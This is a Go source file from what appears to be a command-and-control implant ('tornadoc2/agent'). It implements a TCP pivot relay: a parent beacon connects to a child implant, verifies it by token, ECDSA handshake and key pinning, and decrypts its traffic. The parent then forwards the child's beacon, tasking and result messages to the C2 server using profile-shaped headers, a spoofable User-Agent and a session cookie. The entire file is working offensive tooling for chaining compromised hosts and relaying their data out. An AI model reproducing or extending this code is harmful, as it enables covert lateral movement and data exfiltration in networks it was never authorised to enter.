package core

import (
	"bufio"
	"bytes"
	"crypto/ecdsa"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"tornadoc2/agent/internal/pivot"
)

type tcpRelay struct {
	parent       *Agent
	target       string
	token        string
	pivotPrivKey *ecdsa.PrivateKey

	mu         sync.Mutex
	stopCh     chan struct{}
	stopped    bool
	conn       net.Conn
	pinnedKeys map[string]*ecdsa.PublicKey
}

func newTCPRelay(parent *Agent, target, tokenHex string,
	pivotPrivKey *ecdsa.PrivateKey) *tcpRelay {

	return &tcpRelay{
		parent:       parent,
		target:       target,
		token:        tokenHex,
		pivotPrivKey: pivotPrivKey,
		stopCh:       make(chan struct{}),
		pinnedKeys:   map[string]*ecdsa.PublicKey{},
	}
}

func (r *tcpRelay) start() error {
	if r.pivotPrivKey == nil {
		return fmt.Errorf(
			"tcp pivot: pivot private key not configured")
	}
	go r.loop()
	diag("[beacon] tcp pivot: dialing %s\n", r.target)
	return nil
}

func (r *tcpRelay) stop() {
	r.mu.Lock()
	if r.stopped {
		r.mu.Unlock()
		return
	}
	r.stopped = true
	close(r.stopCh)
	conn := r.conn
	r.mu.Unlock()
	if conn != nil {
		conn.Close()
	}
}

func (r *tcpRelay) loop() {
	for {
		select {
		case <-r.stopCh:
			return
		default:
		}
		err := r.serveOnce()
		if err != nil && !r.stopped {
			diag("[beacon] tcp pivot: %v\n", err)
		}
		select {
		case <-r.stopCh:
			return
		case <-time.After(5 * time.Second):
		}
	}
}

type parentTCPIO struct {
	conn net.Conn
	rd   *bufio.Reader
}

func (f *parentTCPIO) WriteFrame(body []byte) error {
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(body)))
	if _, err := f.conn.Write(lenBuf[:]); err != nil {
		return err
	}
	_, err := f.conn.Write(body)
	return err
}

func (f *parentTCPIO) ReadFrame() ([]byte, error) {
	var lenBuf [4]byte
	if _, err := io.ReadFull(f.rd, lenBuf[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > 16*1024*1024 {
		return nil, fmt.Errorf("child frame too large: %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(f.rd, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func (r *tcpRelay) serveOnce() error {
	conn, err := net.DialTimeout("tcp", r.target, 15*time.Second)
	if err != nil {
		return fmt.Errorf("dial %s: %w", r.target, err)
	}
	defer conn.Close()

	var sess *pivot.Session
	defer func() {
		if sess != nil {
			sess.Close()
		}
	}()

	if r.token == "" {
		return errors.New(
			"tcp pivot: relay token is empty")
	}
	token, err := hex.DecodeString(r.token)
	if err != nil {
		return fmt.Errorf("tcp pivot: token is not valid hex: %w",
			err)
	}
	if len(token) == 0 {
		return errors.New(
			"tcp pivot: token decodes to zero bytes")
	}
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(token)))
	if _, err := conn.Write(lenBuf[:]); err != nil {
		return err
	}
	if _, err := conn.Write(token); err != nil {
		return err
	}
	diag("[beacon] tcp pivot: connected to %s\n", r.target)

	rd := bufio.NewReaderSize(conn, 64*1024)
	fio := &parentTCPIO{conn: conn, rd: rd}

	result, err := pivot.ParentVerifyAndRespond(
		fio, r.pivotPrivKey)
	if err != nil {
		return fmt.Errorf("pivot handshake: %w", err)
	}

	// maxPinnedKeys bounds the TOFU pin table. Same rationale
	// as the SMB relay: the map is in-memory and never pruned,
	// so a long-lived parent must cap it.
	const maxPinnedKeys = 4096

	r.mu.Lock()
	if existing, ok := r.pinnedKeys[result.Fingerprint]; ok {
		if !existing.Equal(result.PubKey) {
			r.mu.Unlock()
			return fmt.Errorf(
				"fingerprint %s presented a different key",
				result.Fingerprint[:8])
		}
	} else {
		if len(r.pinnedKeys) >= maxPinnedKeys {
			r.mu.Unlock()
			return fmt.Errorf(
				"pin table full (%d entries); refusing new "+
					"fingerprint %s",
				maxPinnedKeys, result.Fingerprint[:8])
		}
		r.pinnedKeys[result.Fingerprint] = result.PubKey
		diag("[beacon] tcp pivot: pinned child %s (TOFU)\n",
			result.Fingerprint[:8])
	}
	r.mu.Unlock()

	sess = result.Session
	for {
		select {
		case <-r.stopCh:
			return nil
		default:
		}

		conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		rawFrame, err := fio.ReadFrame()
		if err != nil {
			return fmt.Errorf("child frame read: %w", err)
		}
		frame, err := pivot.DecodeFrame(rawFrame)
		if err != nil {
			return fmt.Errorf("child frame decode: %w", err)
		}
		plaintext, err := sess.DecryptChildToParent(frame)
		if err != nil {
			return fmt.Errorf("child frame decrypt: %w", err)
		}
		var env struct {
			Op   string          `json:"op"`
			Body json.RawMessage `json:"body"`
		}
		if err := json.Unmarshal(plaintext, &env); err != nil {
			return fmt.Errorf("bad envelope: %w", err)
		}
		var path string
		switch env.Op {
		case "beacon":
			path = r.parent.profile.BeaconPath
		case "tasks":
			path = r.parent.profile.TasksPath
		case "results":
			path = r.parent.profile.ResultsPath
		}
		if path == "" {
			return fmt.Errorf("unknown op: %s "+
				"(parent profile has no path for this op)", env.Op)
		}

		// The child's body is a wire envelope, not a shaped
		// body. The parent has no key for the child's wire
		// session, so it cannot open the envelope, cannot see
		// the shaped body inside it, and cannot wrap or
		// unwrap the shape on the child's behalf. Every byte
		// in both directions is forwarded verbatim; the child
		// does its own wire decryption and shape unwrap
		// against the profile it was built with.
		serverBody, status, relayErr := r.parent.relayPost(
			path, env.Body, result.Fingerprint, env.Op)
		if relayErr != nil || status < 200 || status >= 300 {
			errMsg := fmt.Sprintf("status %d", status)
			if relayErr != nil {
				errMsg = relayErr.Error()
			}
			errReply, _ := json.Marshal(struct {
				Status int    `json:"status"`
				Error  string `json:"error"`
			}{Status: status, Error: errMsg})
			if respFrame, encErr :=
				sess.EncryptParentToChild(errReply); encErr == nil {
				if respBytes, encErr :=
					pivot.EncodeFrame(respFrame); encErr == nil {
					conn.SetWriteDeadline(
						time.Now().Add(30 * time.Second))
					_ = fio.WriteFrame(respBytes)
				}
			}
			return fmt.Errorf("relay: %s", errMsg)
		}

		wrapped, err := json.Marshal(struct {
			Body json.RawMessage `json:"body"`
		}{
			Body: json.RawMessage(serverBody),
		})
		if err != nil {
			return err
		}

		respFrame, err := sess.EncryptParentToChild(wrapped)
		if err != nil {
			return err
		}
		respBytes, err := pivot.EncodeFrame(respFrame)
		if err != nil {
			return err
		}
		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		if err := fio.WriteFrame(respBytes); err != nil {
			return fmt.Errorf("child frame write: %w", err)
		}
	}
}

func (a *Agent) relayPost(path string, body []byte,
	fp string, op string) ([]byte, int, error) {

	url := strings.TrimRight(DefaultURL, "/") + path

	method := "POST"
	var reqBody io.Reader
	if op == "tasks" {
		method = "GET"
		reqBody = nil
	} else {
		reqBody = bytes.NewReader(body)
	}

	req, err := http.NewRequest(method, url, reqBody)
	if err != nil {
		return nil, 0, err
	}

	req.Header.Set("Content-Type", "application/json")
	if ua := a.profile.UserAgent; ua != "" {
		req.Header.Set("User-Agent", ua)
	}
	for k, v := range a.profile.ExtraHeaders {
		req.Header.Set(k, v)
	}
	for k, v := range a.profile.RequestHeaders {
		req.Header.Set(k, v)
	}

	req.Header.Set("X-Relay-Child", fp)

	if a.session.Cookie != "" {
		cname := a.profile.CookieName
		if cname == "" {
			cname = "sid"
		}
		req.Header.Set("Cookie", cname+"="+a.session.Cookie)
	}

	client := a.relayClient()
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(resp.Body)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return bodyBytes, resp.StatusCode,
			fmt.Errorf("status %d", resp.StatusCode)
	}
	return bodyBytes, resp.StatusCode, nil
}

func (a *Agent) relayClient() *http.Client {
	a.relayClientOnce.Do(func() {
		tlsCfg, _ := BuildTLSConfig(a.cfg)
		a.relayClientInst = &http.Client{
			Timeout: 45 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig:     tlsCfg,
				ForceAttemptHTTP2:   false,
				MaxIdleConnsPerHost: 2,
			},
		}
	})
	return a.relayClientInst
}